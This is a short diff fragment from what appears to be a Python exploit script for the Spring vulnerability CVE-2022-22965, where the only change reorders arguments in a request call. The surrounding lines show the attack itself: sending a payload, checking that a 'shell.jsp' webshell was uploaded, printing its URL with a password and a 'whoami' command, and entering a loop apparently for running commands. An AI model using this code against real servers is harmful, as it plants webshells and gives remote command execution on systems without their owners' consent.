@@ -61,7 +61,7 @@ def CVE_2022_22965(url, proxies, header_new):
         requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         sleep(0.5)
         test = requests.get(url + "shell.jsp", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
-        test_again = requests.get(url + "shell.jsp", verify=False, timeout=6, allow_redirects=False, proxies=proxies)
+        test_again = requests.get(url + "shell.jsp", timeout=6, allow_redirects=False, verify=False, proxies=proxies)
         if (test_again.status_code == 200):
             cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "shell.jsp?pwd=aabysszg&cmd=whoami" ,"red")
             while 1:
